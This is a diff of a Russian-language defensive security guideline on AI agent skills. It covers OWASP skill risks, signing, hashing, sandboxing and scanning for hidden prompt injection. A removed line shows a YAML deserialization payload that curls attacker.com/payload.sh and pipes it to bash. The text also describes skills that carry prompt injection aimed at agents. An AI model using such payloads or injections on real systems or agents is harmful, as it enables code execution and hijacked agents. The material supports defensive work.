@@ -1,166 +1,205 @@
-### Подпись skill.md / memory.md and проверка до использования
+# Безопасность Agent Skills
+
+Область: skills (папки с `SKILL.md`, скриптами и ресурсами), которые агент подгружает в контекст и исполняет (Claude Skills, Codex/Gemini skills, OpenClaw/ClawHub и т.п.), а также подобные артефакты-инструкции (`memory.md`, `AGENTS.md`, rules-файлы).
+Skill — это одновременно **промпт** (текст попадает в контекст и может нести prompt injection) и **код** (скрипты исполняются с правами агента).
+Связанные файлы: [Agent Security](Agent%20Security.md), [MCP Security](MCP%20Security.md), [AI Coding Assistants](AI%20Coding%20Assistants%20Security.md).
+
+## Угрозы — OWASP Agentic Skills Top 10 (AST10, draft)
+Проект в статусе черновика, названия пунктов менялись. Сверяться с https://owasp.org/www-project-agentic-skills-top-10/
+
+| ID | Риск | Суть |
+|---|---|---|
+| AST01 | Malicious Skills | skill изначально вредоносный: эксфильтрация, бэкдор, скрытые инструкции |
+| AST02 | Supply Chain Compromise | компрометация автора, реестра, обновления (rug pull), typosquatting |
+| AST03 | Over-Privileged Skills | skill получает больше инструментов, сети и FS, чем нужно |
+| AST04 | Insecure Metadata | ложные или вредоносные метаданные, атаки на парсеры YAML/JSON frontmatter |
+| AST05 | Untrusted External Instructions | skill подтягивает инструкции из внешних URL во время работы |
+| … | … | см. оригинал |
+| AST10 | Cross-Platform Reuse | один skill переносится между платформами с разной моделью разрешений |
+
+В публичных реестрах skills уже наблюдались массовые кампании с вредоносными skills (2026). Исследование Snyk ToxicSkills показало, что вредоносные skills обычно сочетают prompt injection в тексте и вредоносный код в скриптах.
+
+---
+
+## Требования
+
+### SK-A. Происхождение и целостность
+- [ ] **SK-01** `MUST` Skills устанавливаются только из утверждённого внутреннего реестра или репозитория. Автоматическая установка из публичных маркетплейсов отключена.
+- [ ] **SK-02** `MUST` Skill закреплён по хешу содержимого всей папки (или по commit SHA). Хеш проверяется перед каждой загрузкой, а любое изменение требует повторного ревью (защита от rug pull).
+- [ ] **SK-03** `MUST` Skills подписаны издателем. Публичный ключ берётся из trust store по identity издателя и **никогда из самого skill** (иначе атакующий подпишет своим ключом). Отозванные ключи отклоняются.
+- [ ] **SK-04** `SHOULD` Инвентарь skills: владелец, версия, хеш, где используется, дата последнего ревью.
+
+### SK-B. Манифест и минимальные привилегии
+- [ ] **SK-05** `MUST` У каждого skill декларированы: назначение, `allowed-tools`, сетевой доступ (домены), доступ к FS, необходимые секреты, уровень риска.
+- [ ] **SK-06** `MUST` Платформа **принудительно** применяет декларацию (skill не может вызвать инструмент вне `allowed-tools`). Декларация без enforcement — только документация.
+- [ ] **SK-07** `MUST` Декларированные разрешения сверяются с фактическим поведением в песочнице перед публикацией.
+- [ ] **SK-08** `MUST` Skills не содержат секретов и не просят пользователя или агента вставлять их в текст.
+
+### SK-C. Содержимое и инъекции
+- [ ] **SK-09** `MUST` Skill не загружает инструкции из внешних источников во время работы («скачай актуальные правила с URL»). Внешний контент — только данные.
+- [ ] **SK-10** `MUST` Статический анализ `SKILL.md` и метаданных: невидимые Unicode (Tag, zero-width, bidi), base64 и иные закодированные блоки, HTML-комментарии с инструкциями, указания игнорировать предыдущие правила, обращения к секретам и сети, несоответствие описания реальному содержимому.
+- [ ] **SK-11** `MUST` Безопасный разбор метаданных: `yaml.safe_load` (не `yaml.load`/`UnsafeLoader`, иначе `!!python/object/apply:os.system [...]` = RCE), валидация по JSON Schema / Pydantic, allowlist ключей, отказ при неизвестных полях.
+- [ ] **SK-12** `MUST` Разбор skill-файлов и установка их зависимостей (`requirements.txt`, `package.json`, `pyproject.toml`) идут в изолированном процессе с минимальными привилегиями. Зависимости — недоверенный код.
+- [ ] **SK-13** `SHOULD` Поведенческие сканеры, оценивающие намерение, а не только сигнатуры (например, [NVIDIA SkillSpector](https://github.com/NVIDIA/SkillSpector): быстрые статические проверки + опциональный LLM-анализ семантики). Проверка соответствия skill его заявленной семантике.
+
+### SK-D. Исполнение
+- [ ] **SK-14** `MUST` Скрипты skills исполняются в песочнице: без сети по умолчанию, read-only FS, non-root, `cap-drop ALL`, `no-new-privileges`, лимиты CPU/RAM/PID/времени, образ закреплён по digest.
+- [ ] **SK-15** `MUST` Исполняются только файлы из утверждённого корня (защита от path traversal и symlink).
+- [ ] **SK-16** `SHOULD` Защита от подмены бренда: проверка имён на сходство с известными skills (typosquatting), отображение издателя, ключа и даты публикации в UI реестра.
+
+---
+
+## Примеры реализации
+
+### Проверка подписи (Ed25519, PyNaCl) с trust store
 ```py
 import nacl.encoding
 from nacl.signing import VerifyKey
 from nacl.exceptions import BadSignatureError
-def verify_skill_signature(skill_content: str, signature: str, public_key: str) ->
 
-bool:
- """Verify Ed25519 signature of skill content using PyNaCl (the 'ed25519' PyPI
-package is unmaintained)."""
- try:
- verify_key = VerifyKey(public_key, encoder=nacl.encoding.HexEncoder)
- verify_key.verify(skill_content.encode(), bytes.fromhex(signature))
- return True
- except BadSignatureError:
- return False
-# Usage in registry - pubkey is resolved from a trust store keyed by publisher
-identity,
-# never accepted from the skill payload itself, so a self-signed attacker key cannot
-pass verification.
+
+def verify_skill_signature(skill_content: bytes, signature: str, public_key: str) -> bool:
+    """Verify Ed25519 signature of skill content using PyNaCl
+    (the 'ed25519' PyPI package is unmaintained)."""
+    try:
+        verify_key = VerifyKey(public_key, encoder=nacl.encoding.HexEncoder)
+        verify_key.verify(skill_content, bytes.fromhex(signature))
+        return True
+    except BadSignatureError:
+        return False
+
+
+# Pubkey is resolved from a trust store keyed by publisher identity,
+# never accepted from the skill payload itself, so a self-signed attacker key
+# cannot pass verification.
 def install_skill(skill_path: str, signature: str, publisher_id: str):
- trusted_key = TRUST_STORE.get_active_key(publisher_id) # raises if unknown or
-revoked
- with open(skill_path, 'r') as f:
- content = f.read()
- if not verify_skill_signature(content, signature, trusted_key):
- raise ValueError("Invalid skill signature")
- # Proceed with installation
+    trusted_key = TRUST_STORE.get_active_key(publisher_id)  # raises if unknown or revoked
+    with open(skill_path, "rb") as f:
+        content = f.read()
+    if not verify_skill_signature(content, signature, trusted_key):
+        raise ValueError("Invalid skill signature")
+    # Proceed with installation
+```
+> Подписывать стоит не только `SKILL.md`, но и всю папку (манифест хешей всех файлов): скрипты тоже часть skill.
+
+### Проверка хеша при загрузке из внешнего источника
+```py
+import hashlib
+import hmac
+
+
+def verify_skill_file(file_path: str, expected_hash: str) -> bool:
+    """Verify integrity of SKILL.md"""
+    h = hashlib.sha256()
+    with open(file_path, "rb") as f:
+        for chunk in iter(lambda: f.read(65536), b""):
+            h.update(chunk)
+    return hmac.compare_digest(h.hexdigest(), expected_hash.lower())
 ```
 
-### Изоляция окружения при исполнении skill
+### Исполнение скрипта skill в песочнице
 ```py
 import subprocess
 import uuid
 from pathlib import Path
-ALLOWED_ROOT = Path('/srv/approved-skills').resolve()
-IMAGE = 'alpine@sha256:<approved-digest>'
+
+ALLOWED_ROOT = Path("/srv/approved-skills").resolve()
+IMAGE = "alpine@sha256:<approved-digest>"
+
+
 def run_skill_in_sandbox(skill_script: str, timeout: int = 30):
- '''Run an approved regular file in a locked-down, digest-pinned container.'''
- # is_relative_to() requires Python 3.9+
- script = Path(skill_script).resolve(strict=True)
- if not script.is_file() or not script.is_relative_to(ALLOWED_ROOT):
- raise ValueError('Skill script is outside the approved root')
- name = f'skill-{uuid.uuid4().hex}'
- cmd = [
- 'docker', 'run', '--rm', '--name', name, '--init',
- '--network=none', '--read-only', '--user=65532:65532',
- '--cap-drop=ALL', '--security-opt=no-new-privileges',
- '--pids-limit=64', '--memory=128m', '--cpus=0.5',
- '--tmpfs=/tmp:rw,noexec,nosuid,size=16m',
- '--env=SANDBOX=1',
- '--mount', f'type=bind,src={script},dst=/skill.sh,readonly',
- IMAGE, 'sh', '/skill.sh',
- ]
- try:
- result = subprocess.run(
- cmd, capture_output=True, timeout=timeout,
- stdin=subprocess.DEVNULL, check=False
- )
- except subprocess.TimeoutExpired:
- subprocess.run(
- ['docker', 'rm', '-f', name],
- stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
- )
- raise
- return result.returncode, result.stdout, result.stderr
+    """Run an approved regular file in a locked-down, digest-pinned container."""
+    # is_relative_to() requires Python 3.9+
+    script = Path(skill_script).resolve(strict=True)
+    if not script.is_file() or not script.is_relative_to(ALLOWED_ROOT):
+        raise ValueError("Skill script is outside the approved root")
+
+    name = f"skill-{uuid.uuid4().hex}"
+    cmd = [
+        "docker", "run", "--rm", "--name", name, "--init",
+        "--network=none", "--read-only", "--user=65532:65532",
+        "--cap-drop=ALL", "--security-opt=no-new-privileges",
+        "--pids-limit=64", "--memory=128m", "--cpus=0.5",
+        "--tmpfs=/tmp:rw,noexec,nosuid,size=16m",
+        "--env=SANDBOX=1",
+        "--mount", f"type=bind,src={script},dst=/skill.sh,readonly",
+        IMAGE, "sh", "/skill.sh",
+    ]
+    try:
+        result = subprocess.run(
+            cmd, capture_output=True, timeout=timeout,
+            stdin=subprocess.DEVNULL, check=False,
+        )
+    except subprocess.TimeoutExpired:
+        subprocess.run(["docker", "rm", "-f", name],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        raise
+    return result.returncode, result.stdout, result.stderr
 ```
 
-### Проверка репозитория если skill скачиваются из внешнего источника - проверка хеша
-```py
-import hashlib
-def verify_skill_file(file_path: str, expected_hash: str) -> bool:
- """Verify integrity of SKILL.md"""
- with open(file_path, "rb") as f:
- content = f.read()
- actual_hash = hashlib.sha256(content).hexdigest()
- return actual_hash == expected_hash
+### Поиск невидимых символов
+```sh
+# Unicode Tags, zero-width, bidi controls
+grep -rnP '[\x{E0000}-\x{E007F}\x{200B}-\x{200F}\x{202A}-\x{202E}\x{2060}-\x{2064}\x{FEFF}]' skills/
 ```
 
-### Использование Skill Manifest для определения что должен и не должен делать и проверка
-Использовать структуру https://owasp.org/www-project-agentic-skills-top-10/universal-skill-format.html
-Альтернативно указывать явно это в md файле как метаинформация
-```
+### Манифест skill
+Можно использовать формат OWASP: https://owasp.org/www-project-agentic-skills-top-10/universal-skill-format.html
+
+Или frontmatter в `SKILL.md`:
+```yaml
 ---
-name: Помощник по погоде
+name: weather-helper
 description: Получает погоду для указанного города. Используйте, когда пользователь спрашивает "какая погода в...".
-allowed-tools: [ "curl", "grep" ]
+allowed-tools: ["Bash(curl:https://api.weather.example/*)"]
 argument-hint: [city]
 ---
-
 # Инструкции для ИИ
-Здесь вы пишете подробный текст (промпт) о том, как именно ИИ должен выполнять эту задачу...
+...
 ```
 
-Либо использовать отдельный манифест файл
+Или отдельный манифест:
 ```
 my-agent-skills/
 └── weather-helper/
-    ├── manifest.json  <-- Техническое описание (то, что я показывал в прошлом ответе)
-    ├── README.md      <-- Документация для разработчика
-    └── scripts/       <-- (Опционально) Скрипты, которые ИИ будет запускать
+    ├── manifest.json   <-- техническое описание и разрешения
+    ├── SKILL.md        <-- инструкции для модели
+    └── scripts/        <-- (опционально) скрипты, которые агент запускает
 ```
 
-```manifest.json
+```json
 {
   "manifestVersion": "1.0",
-  "skillId": "weather-and-travel-helper",
-  "name": "Помощник по погоде и путешествиям",
-  "description": "Навык позволяет узнавать текущую погоду и автоматически бронировать билеты на основе прогноза.",
+  "skillId": "weather-helper",
   "version": "2.1.0",
-  "author": "AI Developer",
-  "endpoint": "https://myassistant.local",
-  "permissions": [
-    "user_location",
-    "calendar_write"
-  ],
+  "publisher": "team-appsec",
+  "description": "Получение текущей погоды для города.",
+  "riskTier": "low",
+  "permissions": {
+    "tools": ["http_get"],
+    "network": ["api.weather.example"],
+    "filesystem": [],
+    "secrets": []
+  },
   "actions": [
     {
       "name": "get_current_weather",
-      "description": "Получает текущую погоду для указанного города.",
       "parameters": {
         "type": "object",
         "properties": {
-          "city": {
-            "type": "string",
-            "description": "Название города на русском или английском языке (например, Москва, Paris)."
-          },
-          "units": {
-            "type": "string",
-            "enum": ["celsius", "fahrenheit"],
-            "default": "celsius"
-          }
+          "city":  { "type": "string", "maxLength": 100 },
+          "units": { "type": "string", "enum": ["celsius", "fahrenheit"], "default": "celsius" }
         },
-        "required": ["city"]
+        "required": ["city"],
+        "additionalProperties": false
       }
     }
-  ]
+  ],
+  "integrity": { "files": { "SKILL.md": "sha256:...", "scripts/get.sh": "sha256:..." } }
 }
 ```
 
-### Защита от инъекций
-Проверка файла и защита от атаки на парсеры. Например если код агента использует yaml.UnsafeLoader для загрузки скилла что в свою очередь 
-позволяет сделать иньекцию `!!python/object/apply:os.system ["curl attacker.com/payload.sh | bash"] -`
-Меры защиты
-● Use safe parsers by default - disable dangerous tags (!!python/object, !!python/apply; yaml.load ->
-yaml.safe_load) and apply an allowlist of permitted YAML/JSON keys, rejecting any unexpected fields.
-● Validate metadata against a schema (e.g., JSON Schema, Pydantic) before any deserialization of
-skill-provided data.
-● Apply static analysis to all metadata fields and SKILL.md prose at publish time: flag suspicious
-patterns in general, and specifically ASCII smuggling, base64 payloads, and zero-width characters
-invisible to human reviewers.
-● Validate declared permissions against actual runtime behavior in a sandboxed pre-publish test, and
-cross-reference risk_tier declarations against the permission manifest scope.
-● Parse skill files in an isolated, least-privilege subprocess or container - never deserialize with elevated
-privileges, and treat requirements.txt, package.json, and pyproject.toml as untrusted code whose
-installation is sandboxed.
-● Enforce brand/trademark protection and surface metadata provenance (who declared it, when, from
-which signing key) in the registry UI.
-
-### Аудит skill через сканеры
-● Deploy behavioral analysis scanners that evaluate intent, not just signatures - using calibrated models
-combined with deterministic rules. Agent-skill-aware scanners such as NVIDIA SkillSpector
-(https://github.com/NVIDIA/SkillSpector) (open source, Apache-2.0) pair fast static checks with
-optional LLM semantic analysis for exactly this purpose.
-● Проверка наличия сетевых запросов
-● Соответсвие скилла семантике
+## Источники
+- OWASP Agentic Skills Top 10 — https://owasp.org/www-project-agentic-skills-top-10/
+- NVIDIA SkillSpector — https://github.com/NVIDIA/SkillSpector
+- Snyk, ToxicSkills research (2026)
